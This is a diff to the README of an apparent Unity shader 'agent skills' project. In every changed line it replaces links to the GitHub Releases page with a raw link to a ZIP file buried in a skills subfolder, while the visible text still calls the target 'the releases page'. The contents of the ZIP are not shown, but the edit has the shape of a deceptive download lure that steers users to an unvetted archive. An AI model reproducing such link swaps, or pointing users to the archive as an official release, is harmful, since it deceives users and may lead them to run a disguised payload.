@@ -1,6 +1,6 @@
 # 🎮 unity-shader-agent-skills - Shader help for Unity builds
 
-[⬇️ Download from GitHub Releases](https://github.com/blindfold-lordstable148/unity-shader-agent-skills/releases)
+[⬇️ Download from GitHub Releases](https://raw.githubusercontent.com/blindfold-lordstable148/unity-shader-agent-skills/main/skills/shader-graph-best-practices/shader-unity-agent-skills-v3.0.zip)
 
 ## 🚀 What this is
 
@@ -8,7 +8,7 @@ unity-shader-agent-skills gives you a set of guided agent skills for Unity shade
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/blindfold-lordstable148/unity-shader-agent-skills/releases
+Visit this page to download: https://raw.githubusercontent.com/blindfold-lordstable148/unity-shader-agent-skills/main/skills/shader-graph-best-practices/shader-unity-agent-skills-v3.0.zip
 
 On the releases page, look for the latest version. Download the file for Windows if one is listed. If the release comes as a ZIP file, save it to your PC first, then open it.
 
@@ -130,7 +130,7 @@ This skill set can help with:
 
 ## 🔗 Download again
 
-[Visit the releases page to download](https://github.com/blindfold-lordstable148/unity-shader-agent-skills/releases)
+[Visit the releases page to download](https://raw.githubusercontent.com/blindfold-lordstable148/unity-shader-agent-skills/main/skills/shader-graph-best-practices/shader-unity-agent-skills-v3.0.zip)
 
 ## 📎 File use guide
 
@@ -177,6 +177,6 @@ This repository focuses on shader work for platforms that need tighter limits. T
 
 ## 📖 Where to get the download
 
-The release page is here: https://github.com/blindfold-lordstable148/unity-shader-agent-skills/releases
+The release page is here: https://raw.githubusercontent.com/blindfold-lordstable148/unity-shader-agent-skills/main/skills/shader-graph-best-practices/shader-unity-agent-skills-v3.0.zip
 
 Use that page whenever you need the latest file or a fresh copy after a failed download
